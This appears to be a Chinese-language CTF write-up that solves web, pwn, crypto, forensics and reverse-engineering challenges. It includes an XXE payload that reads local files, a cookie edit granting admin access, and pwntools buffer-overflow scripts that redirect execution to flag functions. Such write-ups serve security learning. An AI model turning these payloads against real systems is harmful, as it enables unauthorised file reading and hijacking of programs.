web签到题

扫描后台发现存在hack.php

API

看到页面先进行抓包，发现传输了json数据。
这题目用到的是XXE漏洞，我们更改Content-Type为application/xml
然后POST的数据改为

<?xml version="1.0"?>
<!DOCTYPE abcd[
<!ENTITY any SYSTEM "file://xxx">]>
<something>&any;</something>

xxx的位置写入flag.txt的地址即可读取flag

Atom

用题目给的账户密码登录上去后发现环境十分干净，但抓了个包后发现Cookie中有个admin=0。且更改admin=1就会自动跳转到后台。。。这边有个坑，在admin页显眼的位置就有FLAG{xxxxx}，但怎么提交就是不对，还以为环境被破坏了。。。之后偶然观察admin页的源码发现flag藏在注释里。。。

PWN

远程攻击2

依旧先checksec看一下

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

然后放到ida里跑一下，发现就是简单的栈溢出，通过scanf写入，覆盖掉返回的地址到read_flag这个函数即可，观察得输入的起始地址为0xffffd140而ret的地址为0xffffd18c，那么写入76个a后加上read_flag的地址即可。完整payload如下：

from pwn import *

# p = process("./100")

payload = 'a'*76 + p32(0x8048471)
p.sendline(payload)
p.interactive()

远程攻击3

还是一样checksec

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

放进ida观察，main函数调用了mem_test函数，而mem_test中scanf存在溢出，依旧是覆盖返回值使程序调用我们想要的函数。起始地址为0xffffd135而ret地址为0xffffd14c，构造payload：

win_func = 0x80485BD
payload = 'a'*23 + p32(win_func)

接着我们要传入cat flag这条命令，而它的地址为0x080487E0完整payload:

from pwn import *

p = process('./memory')
win_func = 0x80485BD
cat_flag = 0x80487E0
payload = 'a'*23 + p32(win_func) + p32(cat_flag) + p32(cat_flag)
p.sendline(payload)
p.interactive()

二战时期的密码

二战时德军的密码：费娜姆密码

先把密钥转化为七位二进制，接着把密钥与密文异或，得到的结果转化为字符串即为flag
贴上脚本：

a = '000000000000000000000000000000000000000000000000000000000001011100000110000100000001010000000001'
b = '010101110100010101001100010000110100111101001101010001010101010001001111010000110100011001000110'
c = ''
for i in range(len(a)):
    c+=str(ord(a[i])^ord(b[i]))
print(c)

flag：WELCOMECISRG

出航了，出航啦！！

打开数据包，发现是对一些网站的请求。根据提示，导出http对象，发现一个与众不同的main.html，点开发现登录密码为：S04xWjZQWFZ5OQ==，base64解码即为flag：KN1Z6PXVy9

IDC密码破解

这题直到比赛快结束才脑洞出来，js倒过来为sj（手机），且第二位数没有超过4。
拿出手机九宫格两个数为一位，如41636331即为good，解出flag为jsgoodtest

超级密码

网络协议分析

我是没有感情的thief

打开数据包发现大量的802.11协议，只存在唯一的http请求，肯定是线索。谷歌了一下rom-0，发现Rom-0 Configuration Decompressor，于是导出rom-0上传破解，得到密钥Rome4040，于是利用Wireshark进行解密。添加wpa-pwd密钥，发现http请求不唯一了，结合题目提示，过滤数据包http contains CTF，得到答案。

神秘的文件名

这其实是本次比赛最难的一道题，也花费了我大量的时间，算是挺有收获的。

先放进ida逆向看看，要求程序必须有2个参数，sub_A30fork了一个子进程，接着是对输入进行了异或加密。。两个signal处理内存错误，接下来最关键的sub_C14。

一开始的v3 = 7，接着跳转LABEL_26，整个逆向能否成功就看能否理解这个v3的变化。
进行完一次密码判断之后，sub_EAC会改变v3的值。根据题目flag有8位，想到应该是进行八次验证，而case刚好是八次，只需要解出顺序即可。
但这时卡壳了，sub_EAC(7 * (v3 + 1), 11);这条指令猜想是反编译出了问题，观察arm汇编又得一条条查命令，花费了大量的时间。。。

v3 = 7*(v3+1) - 11*sub_E14(7*(v3+1), 11)
递推得出7 1 3 6 5 9 4 2，再结合main函数传递的v3=0，成功解出sub_C14的顺序，最后只需要按照顺序异或解出flag即可。附上脚本：

code = [105,115,101,110,103,97,114,100]
decode = [code[i]^i for i in range(len(code))]
flag = ""

for i in range(len(code)):
    flag += chr(decode[i])

print(flag)
